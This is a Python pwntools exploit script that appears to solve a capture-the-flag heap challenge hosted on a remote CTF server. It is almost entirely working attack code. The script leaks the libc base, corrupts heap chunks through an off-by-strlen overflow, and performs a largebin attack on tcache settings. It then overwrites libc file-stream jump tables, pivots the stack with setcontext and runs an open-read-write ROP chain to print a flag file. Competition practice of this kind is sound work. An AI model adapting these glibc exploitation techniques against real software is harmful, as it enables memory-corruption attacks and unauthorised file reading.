from pwn import *
import time

context.binary = elf = ELF("./chal")
libc = ELF("./libc.so.6")
#conn = elf.process()
conn = remote("0.cloud.chals.io", 20887)
#context.log_level = 'debug'

def create(idx, sz, dat):
  conn.recvuntil(b">")
  conn.sendline(b"1")
  conn.recvuntil(b">")
  conn.sendline(str(idx).encode())
  conn.recvuntil(b">")
  conn.sendline(str(sz).encode())
  conn.recvuntil(b">")
  conn.send(dat)

def edit(idx, dat):
  conn.recvuntil(b">")
  conn.sendline(b"2")
  conn.recvuntil(b">")
  conn.sendline(str(idx).encode())
  conn.recvuntil(b">")
  conn.send(dat)

def leak(idx):
  conn.recvuntil(b">")
  conn.sendline(b"3")
  conn.recvuntil(b"> ")
  conn.sendline(str(idx).encode())
  return conn.recvuntil(b"1.")[:-2]

def delete(idx):
  conn.recvuntil(b">")
  conn.sendline(b"4")
  conn.recvuntil(b">")
  conn.sendline(str(idx).encode())

#gdb.attach(conn)

# get leak
create(5, 0x1010, b"\x02"*0x400)
create(0, 0x980, b'\0'*0x28 + p64(0x1000)) # fake chunk size
create(3, 0x1030, b'\0'*0x70 + p64(0x590) + p64(0x1000)) # fake prev chunk, chunk size
create(9, 0x4000, b"Buffer") # prevent consolidation
delete(0) # chunk 0 gets put in the large? bin
create(1, 0x460, b'a') # this gets allocated out of chunk 0, but leaves the libc pointers
l = u64(leak(1) + b'\0\0')
libc.address = l - 0x1ee261
info("libc @ " + hex(libc.address))
delete(1) # gets merged with the rest of chunk 0 again

# largebin attack + fsop
create(2, 0x478, b"d"*0x478) # fill the buffer so that edit() will overflow because strlen() sees
                             # the next chunk's size as part of the string
                             # this chunk is allocated out of chunk 0 again
edit(2, b"l"*0x478 + b"\x91\x05") # make the next chunk bigger, to end inside chunk 3
create(4, 0x530, b"c"*0x500 + p64(0x510) + p64(0x1041)) # allocated out of remaining chunk 0, overlaps with chunk 3
delete(3) # this free chunk is overlapped, so we can overwrite poitners
delete(4) # move chunk 3 into largebin

tcache_bins = libc.address + 0x1ed360 + 72 # mp_.tcache_bins, allows us to treat any chunk as a tcache
                                           # this allows us to have more control over where we write
setcontext = libc.address + 0x50055 # used for stack pivot
io_helper_jumps = libc.address + 0x1ee980 # yea... stripped libc is hard

# largebin attack overwrites mp_.tcache_bins with a large value
# I think this chunk is at the right offset from tcache_perthread_struct to be considered the head of the 0x2ff0 tcache bin
create(6, 0x580, b"m"*312 + p64(io_helper_jumps) + b"a"*(0x500-320) + p64(0x510) + p64(0x1041) + p64(l+0x90)*3 + p64(tcache_bins))

delete(5)
create(7, 0x1060, b"c")

rop = ROP(libc) # open read write ropchain
rop.read(0, libc.bss(42), 100)
rop(rax=2, rdi=libc.bss(42), rsi=0, rdx=0)
rop.raw(rop.find_gadget(["syscall", "ret"])[0])
rop.read(3, libc.bss(42), 100)
rop.write(1, libc.bss(42), 100)

print(rop.dump())
r = b"a"*160 + p64(io_helper_jumps+160) + rop.chain() # ropchain with the right padding because setcontext pops rsp

# this gets allocated out of tcache, at io_helper_jumps
# we overwrite _IO_str_jumps's fflush pointer with puts, and when puts is called, it calls _IO_default_uflow, which calls the setcontext gadget with RDX pointed to our input.
# this triggers the ropchain and prints the flag
create(8, 0x2fe0, r + b"a"*(0xc18-len(r)) + p64(setcontext) + b"a"*(3416-0xd40) + p64(libc.address + 0x81e00) + b"b"*296 + p64(libc.sym.puts))

time.sleep(50) # exit() (the normal one) will be called after 32 seconds in the SIGALRM handler
conn.sendline(b"flag.txt\0") # filename for flag
conn.interactive() # get the flag
